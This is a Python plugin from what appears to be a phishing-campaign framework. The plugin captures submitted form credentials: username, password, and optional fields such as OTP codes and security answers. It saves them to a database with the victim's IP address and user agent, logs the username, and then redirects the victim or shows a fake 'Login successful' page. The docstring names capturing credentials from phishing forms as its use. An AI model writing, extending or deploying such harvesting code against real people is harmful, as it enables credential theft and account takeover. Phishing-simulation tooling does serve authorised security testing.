"""
Capture credentials plugin - captures form credentials
"""
from typing import Dict, Any, Optional, List
from ..base import BasePlugin
from shared.database import db, Event
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

class CaptureCredentialsPlugin(BasePlugin):
    """
    Plugin for capturing and storing credentials from form submissions.
    
    Extracts username/email, password, and additional fields from form data,
    logs them as events in the database, and stores them in context for
    use by subsequent plugins (e.g., notifications, redirects).
    
    Use cases:
    - Capture login credentials from phishing forms
    - Log form submissions for analysis
    - Extract user input for processing
    - Trigger notifications when credentials are captured
    
    Example: Capture 'email' and 'password' fields, log to database, then
    send Slack notification with captured credentials.
    """
    
    @property
    def plugin_type(self) -> str:
        return "capture_credentials"
    
    @property
    def display_name(self) -> str:
        return "Capture Credentials"
    
    @property
    def description(self) -> str:
        return "Capture credentials from form submissions and log them to the database. Extracts username/email, password, and additional fields. Stores captured data in context for use by subsequent plugins. Use to log credentials, trigger notifications, or process user input."
    
    @property
    def plugin_category(self) -> str:
        return "capture"
    
    @property
    def config_schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "username_field": {
                    "type": "string",
                    "title": "Username/Email Field Name",
                    "description": "Form field name containing username or email",
                    "help": "Name of the HTML form input field that contains the username or email address. This is typically 'email', 'username', 'user', or 'login'. The value will be stored in 'captured_credentials.username'.",
                    "placeholder": "email, username, user, login",
                    "default": "email"
                },
                "password_field": {
                    "type": "string",
                    "title": "Password Field Name",
                    "description": "Form field name containing password",
                    "help": "Name of the HTML form input field that contains the password. This is typically 'password', 'pass', or 'pwd'. The value will be stored in 'captured_credentials.password'.",
                    "placeholder": "password, pass, pwd",
                    "default": "password"
                },
                "additional_fields": {
                    "type": "array",
                    "title": "Additional Fields",
                    "items": {"type": "string"},
                    "description": "Additional form field names to capture",
                    "help": "List of additional form field names to capture beyond username and password. Each field will be stored in 'captured_credentials.{field_name}'. Example: ['phone', 'security_question', 'otp']",
                    "placeholder": "phone, security_question, otp"
                },
                "redirect_after": {
                    "type": "string",
                    "title": "Redirect URL",
                    "description": "URL to redirect user to after capturing credentials",
                    "help": "Optional URL to redirect the user after credentials are captured. Supports variable interpolation with {{variable}} syntax. If not provided, will show success_message or continue workflow. Example: https://login.example.com/dashboard or {{target.landing_page}}",
                    "placeholder": "https://login.example.com/dashboard, {{target.landing_page}}"
                },
                "success_message": {
                    "type": "string",
                    "title": "Success Message",
                    "description": "HTML message to display after capture (if no redirect)",
                    "help": "Optional HTML message to display to the user after credentials are captured. Only used if redirect_after is not set. Supports variable interpolation. Example: <h1>Login successful!</h1><p>Redirecting...</p>",
                    "placeholder": "<h1>Login successful!</h1><p>Redirecting...</p>"
                }
            },
            "required": []
        }
    
    def execute(self, context: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Execute credential capture"""
        try:
            campaign_id = context.get('campaign', {}).get('id')
            if not campaign_id:
                logger.warning("No campaign ID in context, cannot capture credentials")
                return context
            
            form_data = context.get('request', {}).get('form_data', {})
            username_field = config.get('username_field', 'email')
            password_field = config.get('password_field', 'password')
            additional_fields = config.get('additional_fields', [])

            # Skip capture if neither credential field is present in form data.
            # This avoids logging empty entries on MFA postbacks (which only
            # contain the MFA code field) while still capturing intentionally
            # blank submissions from the login form (where the fields exist
            # but are empty strings).
            if username_field not in form_data and password_field not in form_data:
                logger.debug("Credential fields not in form data, skipping capture (likely MFA postback)")
                return context

            # Extract credentials
            credentials = {
                'username': form_data.get(username_field, ''),
                'password': form_data.get(password_field, '')
            }
            
            # Add additional fields
            for field in additional_fields:
                if field in form_data:
                    credentials[field] = form_data[field]
            
            # Log event with credentials
            event_data = {
                'credentials': credentials,
                'form_data': form_data,
                'captured_at': datetime.utcnow().isoformat()
            }
            
            # Get session ID - try multiple locations
            session_id = (
                context.get('session', {}).get('session_id') or
                context.get('session', {}).get('id') or
                None
            )
            
            event = Event(
                campaign_id=campaign_id,
                event_type='credentials',
                data=event_data,
                ip_address=context.get('request', {}).get('ip_address'),
                user_agent=context.get('request', {}).get('user_agent'),
                session_id=session_id
            )
            
            db.session.add(event)
            db.session.commit()
            
            logger.info(
                f"Credentials captured for campaign {campaign_id}: "
                f"username={credentials.get('username', 'N/A')}, "
                f"event_id={event.id}, session_id={session_id}"
            )
            
            # Store in context
            context['captured_credentials'] = credentials
            context['last_event_id'] = event.id
            
            # Handle redirect or success message
            redirect_url = config.get('redirect_after')
            if redirect_url:
                context['_response_redirect'] = redirect_url
            elif config.get('success_message'):
                context['_response_html'] = f"<html><body><h1>{config['success_message']}</h1></body></html>"
            
            return context
            
        except Exception as e:
            logger.error(f"Credential capture failed: {e}")
            db.session.rollback()
            return self.on_error(e, context, config)
    
    def validate_config(self, config: Dict[str, Any]) -> Optional[List[str]]:
        """Validate credential capture configuration"""
        # No required fields, all optional
        return None

